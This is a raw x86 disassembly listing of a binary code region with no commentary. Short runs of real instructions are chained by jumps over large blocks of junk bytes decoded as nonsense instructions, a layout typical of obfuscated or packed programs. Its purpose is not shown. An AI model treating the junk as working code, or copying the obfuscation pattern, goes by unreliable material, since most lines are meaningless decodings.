  4274f5:	in     al,0x60
  4274f7:	ins    DWORD PTR es:[edi],dx
  4274f8:	pop    ss
  4274f9:	xchg   esp,eax
  4274fa:	sub    DWORD PTR [edi+eiz*1+0x374660d],eax
  427501:	or     eax,0xae0cb542
  427506:	mov    al,0xb6
  427508:	add    eax,0xf5a448ac
  42750d:	xchg   esi,eax
  42750e:	cmp    ch,BYTE PTR [ecx-0x201e177a]
  427514:	cmp    al,0x94
  427516:	(bad)  
  427517:	mov    WORD PTR [ebx],ds
  427519:	and    esi,esi
  42751b:	push   0xffffff90
  42751d:	adc    al,0x72
  42751f:	iret   
  427520:	and    al,0xe3
  427522:	into   
  427523:	mov    ds:0x42f3dc,eax
  427528:	jmp    0x427608
  42752d:	sbb    BYTE PTR [esi+0x61],ah
  427530:	idiv   BYTE PTR [edi-0x9]
  427533:	lahf   
  427534:	out    dx,al
  427535:	mov    fs,ebx
  427537:	adc    al,0x33
  427539:	outs   dx,DWORD PTR ds:[esi]
  42753a:	lea    esi,[esi+0x2]
  42753d:	cld    
  42753e:	rol    BYTE PTR [ecx],1
  427540:	add    bl,al
  427542:	add    BYTE PTR [eax],al
  427544:	add    BYTE PTR [eax],bl
  427546:	mov    dl,0x1e
  427548:	es loope 0x42752f
  42754b:	xchg   eax,ebp
  42754d:	jbe    0x42754e
  42754f:	gs mov cl,0x9c
  427552:	or     cl,BYTE PTR [eax]
  427554:	sbb    esi,edi
  427556:	xor    al,0xd9
  427558:	and    al,0x31
  42755a:	push   0x55764da4
  42755f:	clc    
  427560:	mov    ebp,DWORD PTR [ebx-0x57bef071]
  427566:	stos   DWORD PTR es:[edi],eax
  427567:	(bad)  
  427568:	inc    eax
  427569:	out    dx,al
  42756a:	pop    es
  42756b:	fcom   QWORD PTR [esi]
  42756d:	(bad)  
  42756e:	xor    edi,DWORD PTR [ecx+0xb8e8433]
  427574:	cli    
  427575:	lods   al,BYTE PTR ds:[esi]
  427576:	int    0xca
  427578:	ror    ch,1
  42757a:	int3   
  42757b:	adc    BYTE PTR ds:0x9dbb5b48,ch
  427581:	push   0xb97a52c8
  427586:	dec    esp
  427587:	in     eax,dx
  427588:	int    0xd3
  42758a:	test   esi,eax
  42758c:	sti    
  42758d:	fbstp  TBYTE PTR [ebp-0xf]
  427590:	inc    eax
  427591:	jmp    DWORD PTR [esi]
  427593:	pop    ecx
  427594:	sub    BYTE PTR [edx],0xf8
  427597:	mov    ecx,0x999f119
  42759c:	dec    esp
  42759d:	sub    DWORD PTR [eax-0x21],edi
  4275a0:	out    0x37,eax
  4275a2:	fsubr  st,st(5)
  4275a4:	cdq    
  4275a5:	test   al,0x37
  4275a7:	mov    BYTE PTR [edx-0x70],bl
  4275aa:	pop    esi
  4275ab:	jmp    0xdf6:0x6d32e6c8
  4275b2:	pop    eax
  4275b3:	adc    edi,0xffffffb9
  4275b6:	std    
  4275b7:	inc    esp
  4275b8:	test   al,0x5d
  4275ba:	add    dl,BYTE PTR [ecx-0x764adbbd]
  4275c0:	jns    0x4275ce
  4275c2:	cmp    al,0xdc
  4275c4:	sub    DWORD PTR [ecx],eax
  4275c6:	cwde   
  4275c7:	mov    ah,0xd2
  4275c9:	out    0x57,eax
  4275cb:	fadd   DWORD PTR [esi-0x97e382e]
  4275d1:	jmp    0xc7eb9fdd
  4275d6:	adc    al,0xdb
  4275d8:	or     esp,edi
  4275da:	mov    ds:0xd420e22d,al
  4275df:	push   ecx
  4275e0:	nop
  4275e1:	jo     0x42758a
  4275e3:	add    BYTE PTR [ecx+0x5298cda8],ah
  4275e9:	sbb    eax,edi
  4275eb:	cmp    BYTE PTR [ebp-0x2709dddf],ah
  4275f1:	test   BYTE PTR es:[ecx+0x7],bl
  4275f5:	out    0x63,eax
  4275f7:	stos   BYTE PTR es:[edi],al
  4275f8:	pop    edx
  4275f9:	add    eax,0x929f6627
  4275fe:	stc    
  4275ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427600:	fs jge 0x427585
  427603:	(bad)  
  427604:	aam    0x25
  427606:	and    al,0x36
  427608:	mov    eax,DWORD PTR [esp+0x10]
  42760c:	mov    ecx,DWORD PTR [esp+0x14]
  427610:	xor    eax,esi
  427612:	sub    eax,edi
  427614:	add    DWORD PTR ds:0x42f5c4,edi
  42761a:	mov    ds:0x42f2ac,eax
  42761f:	xor    ecx,ecx
  427621:	add    ecx,DWORD PTR ds:0x42f690
  427627:	xor    eax,eax
  427629:	xor    eax,DWORD PTR ds:0x42c038
  42762f:	sub    eax,ecx
  427631:	and    ecx,DWORD PTR [ecx+eax*1]
  427634:	mov    DWORD PTR [esp+0x78],0xebeb4fd7
  42763c:	movzx  ecx,BYTE PTR ds:0x42f598
  427643:	xor    DWORD PTR ds:0x42f5b8,ecx
  427649:	mov    DWORD PTR [esp+0x7c],ebx
  42764d:	adc    ecx,eax
  42764f:	mov    eax,DWORD PTR [esp+0x78]
  427653:	or     DWORD PTR ds:0x42f590,0x1220
  42765d:	jmp    0x42773d
  427662:	lods   eax,DWORD PTR ds:[esi]
  427663:	add    edx,DWORD PTR [esi-0x5e]
  427666:	(bad)  
  427667:	idiv   ebp
  427669:	(bad)  
  42766b:	adc    dl,BYTE PTR [ebx+0x16944c7]
  427671:	ret    
  427672:	mov    edi,0xc30001d1
  427677:	add    BYTE PTR [eax],al
  427679:	add    BYTE PTR [ecx+0x278af7e9],al
  42767f:	stos   BYTE PTR es:[edi],al
  427680:	fld    DWORD PTR [ecx]
  427682:	sub    edi,DWORD PTR [edx+0x3]
  427685:	fisttp WORD PTR ds:0x45fc8bab
  42768b:	xchg   esp,eax
  42768c:	pushf  
  42768d:	xlat   BYTE PTR ds:[ebx]
  42768e:	fbld   TBYTE PTR [ebx]
  427690:	adc    bh,al
  427692:	retf   0xdeda
  427695:	or     BYTE PTR [edi-0x71],cl
  427698:	dec    ebp
  427699:	das    
  42769a:	mov    ch,0x59
  42769c:	jle    0x42763f
  42769e:	fwait
  42769f:	loop   0x42770e
  4276a1:	mov    eax,eax
  4276a3:	sub    BYTE PTR ds:0x5c70d14b,dh
  4276a9:	nop
  4276aa:	jmp    0xc1a2f1e5
  4276af:	aad    0x10
  4276b1:	jns    0x427675
  4276b3:	pop    ds
  4276b4:	shr    DWORD PTR [eax+0x2d],cl
  4276b7:	inc    ecx
  4276b8:	aas    
  4276b9:	pop    ebx
  4276ba:	ds jns 0x4276a6
  4276bd:	lock fs std 
  4276c0:	cli    
  4276c1:	adc    BYTE PTR [edi-0x1a],0xcf
  4276c5:	clc    
  4276c6:	fidivr WORD PTR [eax]
  4276c8:	or     ebx,ecx
  4276ca:	dec    edx
  4276cb:	jbe    0x4276f8
  4276cd:	dec    esp
  4276ce:	xchg   esi,eax
  4276cf:	imul   esp,DWORD PTR [edx-0x728fc58c],0x824204f5
  4276d9:	cli    
  4276da:	pop    esi
  4276db:	pushf  
  4276dc:	jae    0x42770b
  4276de:	sti    
  4276df:	retf   0xd367
  4276e2:	leave  
  4276e3:	inc    eax
  4276e4:	xchg   edi,eax
  4276e5:	adc    BYTE PTR [ecx+0x51],dh
  4276e8:	add    eax,0x9c9cd191
  4276ed:	sub    al,0xb6
  4276ef:	js     0x427729
  4276f1:	jmp    0x42771b
  4276f3:	test   eax,0x7c1a6ebd
  4276f8:	dec    eax
  4276f9:	pop    ebx
  4276fa:	cmp    bh,BYTE PTR [edi+0x224213ff]
  427700:	sar    BYTE PTR [edi],cl
  427702:	push   esp
  427703:	mov    ah,0xce
  427705:	or     al,bl
  427707:	mov    ds:0x26a8c19f,al
  42770c:	test   DWORD PTR [ebx],ebx
  42770e:	cmp    edx,ebx
  427710:	mov    ebp,0xa2e510f4
  427715:	repnz sbb BYTE PTR [ebp+0x62],dh
  427719:	mov    esi,0x971b69a6
  42771e:	xor    bh,bh
  427720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427721:	xor    ah,ah
  427723:	cmp    dh,al
  427725:	add    BYTE PTR [esi+0x3a],ah
  427728:	retf   0x44b3
  42772b:	sub    bl,cl
  42772d:	sbb    DWORD PTR [ebx+ecx*4+0x1e],esp
  427731:	add    DWORD PTR [esi],edx
  427733:	stc    
  427734:	sbb    BYTE PTR [esi+ebp*1],cl
  427737:	cmp    eax,0x90b8ece7
  42773c:	pop    ebp
  42773d:	mov    ecx,DWORD PTR [esp+0x7c]
  427741:	dec    DWORD PTR ds:0x42f538
  427747:	xor    eax,esi
  427749:	sub    DWORD PTR ds:0x42f59c,0x42f648
  427753:	sub    eax,edi
  427755:	add    DWORD PTR ds:0x42f610,0x42f550
  42775f:	push   eax
  427760:	mov    eax,ds:0x42f1b4
  427765:	and    DWORD PTR ds:0x42f574,0x7940
  42776f:	jmp    0x42784f
  427774:	loop   0x427705
  427776:	push   cs
  427777:	xchg   BYTE PTR [edi-0x79],ch
  42777a:	jmp    0x441c:0xb078daef
  427781:	xor    BYTE PTR [edi+0x33],0x82
  427785:	rol    BYTE PTR [ecx],cl
  427787:	add    bl,al
  427789:	add    BYTE PTR [eax],al
  42778b:	add    BYTE PTR [eax-0x8],al
  42778e:	in     al,0xa
  427790:	aad    0x79
  427792:	stc    
  427793:	xlat   BYTE PTR ds:[ebx]
  427794:	out    dx,eax
  427795:	ins    DWORD PTR es:[edi],dx
  427796:	xor    BYTE PTR [esi+0x15],ah
  427799:	sub    edi,esp
  42779b:	out    0xe4,al
  42779d:	jle    0x4277e6
  42779f:	lods   eax,DWORD PTR ds:[esi]
  4277a0:	sbb    ebp,ebx
  4277a2:	in     eax,0x38
  4277a4:	cwde   
  4277a5:	pop    edx
  4277a6:	leave  
  4277a7:	retf   
  4277a8:	mov    dl,0x4a
  4277aa:	pusha  
  4277ab:	sbb    dl,BYTE PTR [edi-0x674a1972]
  4277b1:	sahf   
  4277b2:	ins    DWORD PTR es:[edi],dx
  4277b3:	mov    bl,0x88
  4277b5:	jb     0x42777c
  4277b7:	add    al,0xe4
  4277b9:	hlt    
  4277ba:	loope  0x4277b2
  4277bc:	add    dl,dh
  4277be:	sbb    eax,0x3f848a88
  4277c3:	mov    ds:0x782bc7cb,eax
  4277c8:	push   ds
  4277c9:	pop    ss
  4277ca:	dec    edi
  4277cb:	scas   eax,DWORD PTR es:[edi]
  4277cc:	push   esp
  4277cd:	sub    al,0x3b
  4277cf:	test   BYTE PTR [ecx+esi*4],bh
  4277d2:	sbb    dh,0x28
  4277d5:	loop   0x427822
  4277d7:	pop    es
  4277d8:	sub    BYTE PTR [esi-0x46],0x9a
  4277dc:	adc    eax,0x6abc2f62
  4277e1:	pop    ebp
  4277e2:	inc    esp
  4277e4:	inc    esp
  4277e5:	aad    0xaf
  4277e7:	bound  ebp,QWORD PTR [ebp+0x3da71f40]
  4277ed:	data16 cmpxchg dl,bl
  4277f1:	add    BYTE PTR [ecx+esi*1],dl
  4277f4:	adc    al,0x5
  4277f6:	mov    ds:0xa26df021,al
  4277fb:	stc    
  4277fc:	cmp    BYTE PTR [edi-0x76],bl
  4277ff:	adc    bl,BYTE PTR [ebp+0x9]
  427802:	imul   ebp,DWORD PTR [eax-0x5d0676cc],0xffffffaa
  427809:	dec    ecx
  42780a:	mov    ch,bl
  42780c:	popf   
  42780d:	pop    esp
  42780e:	pop    esp
  42780f:	fldenv [ebx-0x38]
  427812:	ds jae 0x4277f7
  427815:	rcl    dh,0x3a
  427818:	jbe    0x427812
  42781a:	jge    0x4277b2
  42781c:	test   eax,0x5d8fb07e
  427821:	mov    cl,0x54
  427823:	push   eax
  427824:	jbe    0x427844
  427826:	cmp    bl,bl
  427828:	sbb    ebp,DWORD PTR [ebx+0x58]
  42782b:	mov    al,ds:0xcdafbcbf
  427830:	add    eax,0x6785b274
  427835:	stos   DWORD PTR es:[edi],eax
  427836:	lea    esp,[edx+0xf817350]
  42783c:	sti    
  42783d:	inc    esi
  42783e:	jmp    0x35fda8bf
  427843:	call   FWORD PTR [edi+0x3ac306db]
  427849:	fisub  DWORD PTR [ebp-0x4909a6bb]
  42784f:	push   DWORD PTR [eax+0x18c]
  427855:	mov    DWORD PTR ds:0x42f640,0x1040
  42785f:	lea    eax,[esp+0x8c]
  427866:	adc    DWORD PTR ds:0x42f670,0x42f594
  427870:	jmp    0x427950
  427875:	out    dx,al
  427876:	jns    0x427839
  427878:	sub    dl,bh
  42787a:	mov    edx,0x62d6fdef
  42787f:	adc    ch,BYTE PTR [esi-0x22]
  427882:	shl    DWORD PTR [edi],1
  427884:	fiadd  WORD PTR [ebp-0x2d]
  427887:	add    DWORD PTR [eax],eax
  427889:	ret    
  42788a:	add    BYTE PTR [eax],al
  42788c:	add    BYTE PTR [edi],cl
  42788e:	arpl   WORD PTR [edi-0x78],di
  427891:	ficomp DWORD PTR [ebx+eiz*2+0xe]
  427895:	push   ds
  427896:	cmp    al,0x23
  427898:	sub    BYTE PTR [esi+0x6c99102b],0x4d
  42789f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278a0:	jp     0x4278f5
  4278a2:	fcom   QWORD PTR ss:[esi+0x69d95a92]
  4278a9:	dec    eax
  4278aa:	cdq    
  4278ab:	pop    esp
  4278ac:	inc    esi
  4278ad:	jae    0x4278da
  4278af:	repz cs lock sub al,0xe1
  4278b4:	lods   eax,DWORD PTR ds:[esi]
  4278b5:	cmp    edi,esi
  4278b7:	fld    st(6)
  4278b9:	xchg   edx,eax
  4278ba:	mov    BYTE PTR [eax-0x643df50b],0x12
  4278c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278c2:	out    0xf5,eax
  4278c4:	xchg   esi,eax
  4278c5:	popa   
  4278c6:	cmp    ecx,DWORD PTR [eax]
  4278c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278c9:	outs   dx,BYTE PTR ds:[esi]
  4278ca:	mov    edi,DWORD PTR [eax-0x9]
  4278cd:	test   DWORD PTR [ecx-0x464f3f28],ebx
  4278d3:	ret    0x7a1
  4278d6:	jle    0x4278ed
  4278d8:	xchg   edi,eax
  4278d9:	xor    al,0x68
  4278db:	and    cl,BYTE PTR [edx-0x2c]
  4278de:	addr16 inc ecx
  4278e0:	div    DWORD PTR [edx+0x63]
  4278e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e4:	jb     0x4278b8
  4278e6:	(bad)  
  4278e7:	(bad)  
  4278e8:	neg    DWORD PTR [edx-0x1c37eb59]
  4278ee:	pop    es
  4278ef:	fstp   DWORD PTR [ebx]
  4278f1:	enter  0xf11b,0x3f
  4278f5:	mov    edx,0xc9059d15
  4278fa:	and    ch,BYTE PTR [ebx-0x55d3384]
  427900:	mov    edi,0xde5d423f
  427905:	test   eax,0x9b669f81
  42790a:	fdiv   st,st(5)
  42790c:	and    DWORD PTR [edx-0x4f553f4c],esp
  427912:	sti    
  427913:	push   edx
  427914:	cmp    BYTE PTR [edx-0x62],0xce
  427918:	adc    eax,edi
  42791a:	xchg   BYTE PTR [ebx],ch
  42791c:	lock add BYTE PTR [edx],dh
  42791f:	cmp    eax,0x3d3b359
  427924:	cmp    eax,0xacba47cb
  427929:	xchg   ebp,eax
  42792a:	lock fisttp QWORD PTR [edx+edi*1]
  42792e:	xchg   DWORD PTR [ebx+0x178b7df7],edi
  427934:	jmp    0x42794c
  427936:	add    BYTE PTR ds:0xcdb354a2,cl
  42793c:	sbb    DWORD PTR fs:[esi],ebp
  42793f:	lahf   
  427940:	ins    BYTE PTR es:[edi],dx
  427941:	sbb    DWORD PTR [edi+ecx*8+0x482feb1b],esi
  427948:	int    0x7c
  42794a:	iret   
  42794b:	xchg   ebp,ebx
  42794d:	fs mov al,0xaf
  427950:	push   eax
  427951:	jmp    0x427a31
  427956:	in     al,dx
  427957:	push   esi
  427958:	loopne 0x427925
  42795a:	cli    
  42795b:	(bad)  
  42795c:	out    dx,eax
  42795d:	ja     0x4279be
  42795f:	ret    0x706a
  427962:	sbb    esi,edx
  427964:	in     al,0x65
  427966:	or     ah,dl
  427968:	add    DWORD PTR [eax],eax
  42796a:	ret    
  42796b:	add    BYTE PTR [eax],al
  42796d:	add    BYTE PTR [edi],ch
  42796f:	or     dh,dl
  427971:	hlt    
  427972:	push   ebx
  427973:	push   ds
  427974:	ja     0x4279c3
  427976:	imul   edx,ebp,0xffffffaf
  427979:	sub    BYTE PTR [edi-0x265b8a88],dl
  42797f:	scas   eax,DWORD PTR es:[edi]
  427980:	stos   DWORD PTR es:[edi],eax
  427981:	mov    ebx,0x4f2ebd7a
  427986:	jge    0x427919
  427988:	outs   dx,BYTE PTR ds:[esi]
  427989:	add    ch,cl
  42798b:	cmp    DWORD PTR [edi+0x65cb079a],ecx
  427991:	jecxz  0x42797e
  427993:	mov    cl,0xb7
  427995:	mov    BYTE PTR [ecx+0x70],al
  427998:	ins    DWORD PTR es:[edi],dx
  427999:	sub    BYTE PTR [esi-0x4dd30f8a],cl
  42799f:	repz popf 
  4279a1:	psrlq  mm2,QWORD PTR [edi+ecx*1-0x76]
  4279a6:	test   al,0xab
  4279a8:	cdq    
  4279a9:	dec    eax
  4279aa:	push   0xcd25ce96
  4279af:	inc    ebx
  4279b0:	(bad)  
  4279b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279b2:	dec    edi
  4279b3:	popa   
  4279b4:	lds    edx,FWORD PTR [edi-0x4038a9b]
  4279ba:	fild   WORD PTR [esi+esi*2-0x7f]
  4279be:	loope  0x4279dc
  4279c0:	push   es
  4279c1:	jb     0x427a40
  4279c3:	enter  0x3319,0x58
  4279c7:	mov    edx,0x84b39528
  4279cc:	jbe    0x4279f2
  4279ce:	nop
  4279cf:	clc    
  4279d0:	sbb    al,0x90
  4279d2:	push   ebx
  4279d3:	jno    0x42797b
  4279d5:	mov    dl,0x92
  4279d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279d8:	mov    esp,DWORD PTR [edx+0x25d413ac]
  4279de:	ja     0x42799a
  4279e0:	nop
  4279e1:	addr16 jle 0x427998
  4279e4:	fisttp DWORD PTR [eax+0x51a1460f]
  4279ea:	gs adc ah,al
  4279ed:	jnp    0x427a03
  4279ef:	clc    
  4279f0:	xor    al,0x3c
  4279f2:	adc    eax,ecx
  4279f4:	mov    bh,0x1a
  4279f6:	adc    BYTE PTR [edx+eiz*1-0x5a18af2e],dl
  4279fd:	mov    ecx,0x5f817fc0
  427a02:	push   ss
  427a03:	rol    edx,0xe1
  427a06:	mov    ss,esp
  427a08:	fild   DWORD PTR [ebx]
  427a0a:	lods   al,BYTE PTR ds:[esi]
  427a0b:	outs   dx,DWORD PTR ds:[esi]
  427a0c:	mov    ah,0xa6
  427a0e:	ins    DWORD PTR es:[edi],dx
  427a0f:	adc    al,0x96
  427a11:	add    bh,dl
  427a13:	add    eax,0x710341d8
  427a18:	icebp  
  427a19:	sub    BYTE PTR [edi+edi*4+0x6f08acc],ch
  427a20:	inc    edi
  427a21:	dec    ebp
  427a22:	clc    
  427a23:	mov    eax,ds:0x3b47f5c1
  427a28:	sti    
  427a29:	mov    ebp,0x4a5b9604
  427a2e:	adc    ch,ch
  427a30:	pop    ebp
  427a31:	call   0x41d107
  427a36:	mov    eax,ds:0x42f564
  427a3b:	sub    DWORD PTR ds:0x42f544,eax
  427a41:	jmp    0x427b21
  427a46:	aad    0xb0
  427a48:	repnz int3 
  427a4a:	test   esi,0x59bbb9ff
  427a50:	sub    eax,0xb22bdc0d
  427a55:	xchg   ebp,eax
  427a56:	retf   
  427a57:	aam    0x1
  427a59:	add    bl,al
  427a5b:	add    BYTE PTR [eax],al
  427a5d:	add    bl,dl
  427a5f:	mov    esp,0x35ab053d
  427a64:	mov    edx,esi
  427a66:	and    bh,BYTE PTR [edx+0x20]
  427a69:	retf   
  427a6a:	adc    DWORD PTR [esi+0x3e],edi
  427a6d:	mov    bl,BYTE PTR [edx+0x60049af8]
  427a73:	mov    al,0x15
  427a75:	inc    ebx
  427a76:	push   ebx
  427a77:	into   
  427a78:	idiv   DWORD PTR [ebx]
  427a7a:	mov    esp,DWORD PTR ds:0xd6dbe83c
  427a80:	bound  ebx,QWORD PTR [esi]
  427a82:	mov    esi,DWORD PTR [ebp-0x5d]
  427a85:	fs call 0x28ef:0x1aa59969
  427a8d:	cmp    edx,DWORD PTR [ebp+0x75]
  427a90:	dec    esi
  427a91:	lods   eax,DWORD PTR ds:[esi]
  427a92:	pusha  
  427a93:	(bad)  
  427a94:	pusha  
  427a95:	shr    DWORD PTR [ebp+0x2a],0xc1
  427a99:	fucom  st(2)
  427a9b:	adc    eax,0x6168e27f
  427aa0:	mov    edx,0xc2866d3e
  427aa5:	out    dx,al
  427aa6:	(bad)  
  427aa8:	jle    0x427a58
  427aaa:	data16 icebp 
  427aac:	jp     0x427a7a
  427aae:	add    al,0x91
  427ab0:	sbb    DWORD PTR [eax-0x25],edx
  427ab3:	(bad)  
  427ab4:	daa    
  427ab5:	pop    ss
  427ab6:	jns    0x427b20
  427ab8:	adc    eax,0xba681b9d
  427abd:	jge    0x427b34
  427abf:	mov    dl,0x2c
  427ac1:	jo     0x427b15
  427ac3:	arpl   WORD PTR ds:0x871620f7,dx
  427ac9:	pop    edi
  427aca:	push   edi
  427acb:	test   ebp,ecx
  427acd:	out    0x31,al
  427acf:	aad    0x9b
  427ad1:	add    BYTE PTR [ebx+0x2e],al
  427ad4:	int    0xe0
  427ad6:	sub    al,bl
  427ad8:	xor    eax,0x12c6f673
  427add:	xchg   ecx,eax
  427ade:	adc    al,0x23
  427ae0:	inc    edi
  427ae1:	in     al,0x27
  427ae3:	out    0x71,eax
  427ae5:	(bad)  
  427ae6:	loopne 0x427af8
  427ae8:	test   al,0xa0
  427aea:	daa    
  427aeb:	push   esp
  427aec:	dec    ebp
  427aed:	mov    ah,0xb6
  427aef:	jns    0x427ad6
  427af1:	fucomp st(6)
  427af3:	sbb    eax,0x227de25c
  427af8:	rcr    DWORD PTR [eax+0x36],0x27
  427afc:	fmul   QWORD PTR [ecx-0x571a3162]
  427b02:	cli    
  427b03:	mov    ds:0x86766001,al
  427b08:	or     BYTE PTR [ebx],al
  427b0a:	sub    eax,0xdbf6fd11
  427b0f:	aaa    
  427b10:	ss inc esp
  427b12:	mov    al,bl
  427b14:	mov    edx,0x4e43df52
  427b19:	cmp    dh,BYTE PTR [ebx+0x529d51d1]
  427b1f:	into   
  427b20:	xchg   DWORD PTR [eax-0x1414b029],edi
  427b26:	mov    DWORD PTR [esp+0x18],eax
  427b2a:	sbb    DWORD PTR ds:0x42f5f4,0x4f0b
  427b34:	jmp    0x427c14
  427b39:	push   ebp
  427b3a:	sti    
  427b3b:	inc    ebp
  427b3c:	(bad)  
  427b3d:	out    dx,eax
  427b3e:	(bad)  
  427b3f:	(bad)  
  427b40:	sti    
  427b41:	(bad)  
  427b42:	mov    al,ds:0x5797e486
  427b47:	mov    ah,0x33
  427b49:	mov    ss,ebp
  427b4b:	add    DWORD PTR [eax],eax
  427b4d:	ret    
  427b4e:	add    BYTE PTR [eax],al
  427b50:	add    ch,bh
  427b52:	mov    edi,0x12d39ea5
  427b57:	sbb    bl,ah
  427b59:	dec    esi
  427b5a:	hlt    
  427b5b:	mov    eax,ds:0xbd28d6be
  427b60:	adc    BYTE PTR [eax-0x54ec6557],dh
  427b66:	add    ecx,eax
  427b68:	pusha  
  427b69:	(bad)  
  427b6a:	jl     0x427b7d
  427b6c:	push   ecx
  427b6d:	jns    0x427b12
  427b6f:	fld    QWORD PTR [esi]
  427b71:	push   esi
  427b72:	sbb    BYTE PTR ds:0x87f871cc,al
  427b78:	xlat   BYTE PTR ds:[ebx]
  427b79:	xchg   ecx,eax
  427b7a:	push   es
  427b7b:	pop    esp
  427b7c:	dec    edi
  427b7d:	pop    edi
  427b7e:	jae    0x427b8d
  427b80:	inc    esp
  427b81:	dec    esp
  427b82:	scas   eax,DWORD PTR es:[edi]
  427b83:	mov    bl,0x8d
  427b85:	push   cs
  427b86:	inc    edi
  427b87:	daa    
  427b88:	sahf   
  427b89:	jmp    0x427b8f
  427b8b:	pop    esp
  427b8c:	int3   
  427b8d:	xor    eax,0x49ad00b1
  427b92:	imul   DWORD PTR [ecx]
  427b94:	lahf   
  427b95:	aas    
  427b96:	jmp    0xf5917da6
  427b9b:	mov    cl,BYTE PTR [eax+0x2673f0a2]
  427ba1:	clc    
  427ba2:	mov    bl,0x6e
  427ba4:	rcl    dh,cl
  427ba6:	(bad)  
  427ba7:	lock retf 
  427ba9:	mov    edx,0xa26f2c66
  427bae:	aad    0x29
  427bb0:	pusha  
  427bb1:	mov    edx,0xb92ed59f
  427bb6:	cld    
  427bb7:	jg     0x427b81
  427bb9:	in     al,0x1
  427bbb:	pop    ecx
  427bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bbd:	dec    ebp
  427bbe:	or     al,0x2c
  427bc0:	pop    eax
  427bc1:	cmc    
  427bc2:	mov    ds:0x2e7bc9bf,eax
  427bc7:	pop    edi
  427bc8:	ds repnz sahf 
  427bcb:	push   ebp
  427bcc:	cmp    DWORD PTR [ecx-0x38a44f53],esp
  427bd2:	jne    0x427ba1
  427bd4:	dec    edi
  427bd5:	cld    
  427bd6:	fnstenv [ecx+0x74]
  427bd9:	mov    ah,BYTE PTR [ebx-0x61]
  427bdc:	aam    0x31
  427bde:	stos   DWORD PTR es:[edi],eax
  427bdf:	xor    BYTE PTR [edi+0x66ed26bd],0x7e
  427be6:	outs   dx,BYTE PTR ds:[esi]
  427be7:	mov    eax,0xa54e1d7b
  427bec:	mov    edx,0x223174aa
  427bf1:	mul    DWORD PTR [ecx]
  427bf3:	ret    
  427bf4:	(bad)  
  427bf5:	and    DWORD PTR [si+0x6385],edx
  427bfa:	sub    al,0x30
  427bfc:	add    DWORD PTR [ebx+0x5b1394f8],0x2c
  427c03:	sbb    al,0xeb
  427c05:	in     eax,dx
  427c06:	jp     0x427baa
  427c08:	or     al,0xdd
  427c0a:	mov    dh,0xcb
  427c0c:	xchg   BYTE PTR [ebp+0x56],bl
  427c0f:	outs   dx,BYTE PTR ds:[esi]
  427c10:	jecxz  0x427bf1
  427c12:	and    eax,0x245c8972
  427c17:	sbb    al,0x81
  427c19:	sbb    eax,0x42f650
  427c1e:	loopne 0x427c15
  427c20:	inc    edx
  427c21:	add    BYTE PTR [ecx-0x16e7dbbc],cl
  427c27:	fild   DWORD PTR [eax]
  427c29:	add    BYTE PTR [eax],al
  427c2b:	popa   
  427c2c:	mov    eax,ds:0xdcfdc47d
  427c31:	stc    
  427c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c33:	and    bh,BYTE PTR [edi]
  427c35:	xchg   ebp,ecx
  427c37:	fnsave [ebp-0x1e]
  427c3a:	int    0x51
  427c3c:	(bad)  
  427c3d:	add    DWORD PTR [eax],eax
  427c3f:	ret    
  427c40:	add    BYTE PTR [eax],al
  427c42:	add    BYTE PTR [esi],ch
  427c44:	iret   
  427c45:	xchg   esi,eax
  427c46:	call   DWORD PTR [edx+esi*8-0xce2f159]
  427c4d:	ins    DWORD PTR es:[edi],dx
  427c4e:	jecxz  0x427bd4
  427c50:	out    0xeb,eax
  427c52:	icebp  
  427c53:	adc    eax,0xc2b3d731
  427c58:	or     eax,0x2e9b5674
  427c5d:	inc    esp
  427c5e:	(bad)  
  427c5f:	dec    ecx
  427c60:	(bad)  
  427c61:	or     eax,0x9c411e66
  427c66:	fidivr DWORD PTR [edx+0x41]
  427c69:	pop    ds
  427c6a:	mov    ds:0x2ef8c1a2,al
  427c6f:	sahf   
  427c70:	jns    0x427c28
  427c72:	pop    ds
  427c73:	and    ch,BYTE PTR [edi-0x3c]
  427c76:	jmp    0x2203:0xf3f67bcb
  427c7d:	dec    edx
  427c7e:	fld    st(0)
  427c80:	and    al,0x18
  427c82:	les    edi,FWORD PTR [ebx+0x3061b873]
  427c88:	stc    
  427c89:	inc    edx
  427c8a:	sub    dh,BYTE PTR ds:0x5045de96
  427c90:	jb     0x427c95
  427c92:	add    edi,DWORD PTR [edi+0x4fb0270c]
  427c98:	test   eax,0xa5eacf8
  427c9d:	sbb    ebx,DWORD PTR [esi]
  427c9f:	cmp    eax,0x4a6db893
  427ca4:	ins    DWORD PTR es:[edi],dx
  427ca5:	inc    esi
  427ca6:	shl    DWORD PTR [ebp-0x6d],1
  427ca9:	and    al,0xe6
  427cab:	add    BYTE PTR [esi+ebp*4+0xc],bl
  427caf:	leave  
  427cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cb1:	push   esp
  427cb2:	ficomp DWORD PTR [edx]
  427cb4:	mov    ecx,0xac1a4df9
  427cb9:	push   eax
  427cba:	add    eax,0xe4a5dcac
  427cbf:	mov    ds:0x725f791,al
  427cc4:	or     BYTE PTR [eax],bl
  427cc6:	out    dx,al
  427cc7:	jp     0x427c9d
  427cc9:	or     DWORD PTR [esi],0xffffffbc
  427ccc:	pushw  es
  427cce:	and    DWORD PTR [ebx],eax
  427cd0:	adc    DWORD PTR [edx+0x6ff87b5d],ebp
  427cd6:	xor    eax,0xc88c0b1f
  427cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cdc:	sub    bh,BYTE PTR [edi+0x2d50af81]
  427ce2:	cmp    edx,DWORD PTR [esi]
  427ce4:	not    dh
  427ce6:	sub    edi,DWORD PTR [ebp+0x6c]
  427ce9:	stos   BYTE PTR es:[edi],al
  427cea:	inc    esi
  427ceb:	add    BYTE PTR [esi+0x4d568449],bl
  427cf1:	mov    eax,0xea1aa974
  427cf6:	push   ebx
  427cf7:	jae    0x427cdf
  427cf9:	inc    edx
  427cfa:	adc    DWORD PTR [edi-0x2],esi
  427cfd:	mov    ebx,0x2729d0d8
